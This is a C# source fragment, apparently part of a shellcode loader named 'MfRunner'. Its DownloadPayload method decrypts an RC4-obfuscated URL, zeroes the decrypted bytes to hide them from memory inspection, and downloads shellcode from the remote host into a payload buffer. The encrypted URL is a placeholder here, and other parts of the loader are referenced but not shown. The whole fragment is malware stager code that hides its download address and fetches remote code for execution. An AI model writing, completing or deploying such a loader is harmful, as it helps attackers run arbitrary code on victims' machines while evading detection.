using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace MfRunner
{
    internal partial class Program
    {
        public static byte[] PAYLOAD_URL_ENCRYPTED_BYTES = new byte[] { 0x00 };
        public static void DownloadPayload()
        {
            ApplyRC4(PAYLOAD_URL_ENCRYPTED_BYTES, DeriveKey(SEED_PAYLOAD_URL));
            
            string shellCodeUrl = Encoding.UTF8.GetString(PAYLOAD_URL_ENCRYPTED_BYTES);
            for (var i = 0; i < PAYLOAD_URL_ENCRYPTED_BYTES.Length; i++) { PAYLOAD_URL_ENCRYPTED_BYTES[i] = 0; }

            var httpClient = new HttpClient();
            PAYLOAD_BYTES = httpClient.GetByteArrayAsync(shellCodeUrl).GetAwaiter().GetResult();
        }
    }
}
